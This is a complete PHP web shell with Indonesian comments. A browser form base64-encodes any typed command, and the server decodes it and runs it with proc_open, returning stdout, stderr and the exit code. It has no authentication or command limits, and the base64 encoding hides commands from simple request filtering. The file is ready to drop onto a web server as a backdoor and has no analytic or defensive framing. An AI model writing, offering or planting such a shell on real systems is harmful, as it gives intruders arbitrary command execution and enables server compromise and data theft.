<?php
$output = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
    // Decode base64 dari input
    $command = base64_decode($_POST['command']);

    // Descriptor untuk STDIN, STDOUT, STDERR
    $descriptorspec = [
        0 => ["pipe", "r"],  // stdin
        1 => ["pipe", "w"],  // stdout
        2 => ["pipe", "w"]   // stderr
    ];

    // Buka proses dengan perintah
    $process = proc_open($command, $descriptorspec, $pipes);

    if (is_resource($process)) {
        fclose($pipes[0]); // Tidak kirim ke stdin

        $stdout = stream_get_contents($pipes[1]);
        fclose($pipes[1]);

        $stderr = stream_get_contents($pipes[2]);
        fclose($pipes[2]);

        $return_value = proc_close($process);

        $output = "<strong>Output:</strong><br><pre>" . htmlspecialchars($stdout) . "</pre>";
        if (!empty($stderr)) {
            $output .= "<strong>Error:</strong><br><pre style='color:red'>" . htmlspecialchars($stderr) . "</pre>";
        }
        $output .= "<strong>Exit Code:</strong> $return_value";
    } else {
        $output = "<p style='color:red'>Gagal membuka proses.</p>";
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8" />
    <title>PHP CMD Executor with Base64</title>
    <script>
        function encodeCommand(event) {
            event.preventDefault();
            const input = document.getElementById('command').value;
            // Encode base64
            const encoded = btoa(input);
            // Set ke hidden input
            document.getElementById('command_encoded').value = encoded;
            // Submit form
            event.target.submit();
        }
    </script>
</head>
<body style="font-family: monospace; background: #f4f4f4; padding: 20px;">
    <h2>Eksekusi Perintah CMD via PHP (Base64 encoded)</h2>
    <form method="post" onsubmit="encodeCommand(event)">
        <label for="command">Masukkan Perintah CMD:</label><br>
        <input type="text" id="command" style="width: 400px;" required placeholder="contoh: ls -la /var/www" autocomplete="off" />
        <!-- Hidden input yang dikirim ke server -->
        <input type="hidden" name="command" id="command_encoded" />
        <button type="submit">Jalankan</button>
    </form>
    <hr>
    <?= $output ?>
</body>
</html>
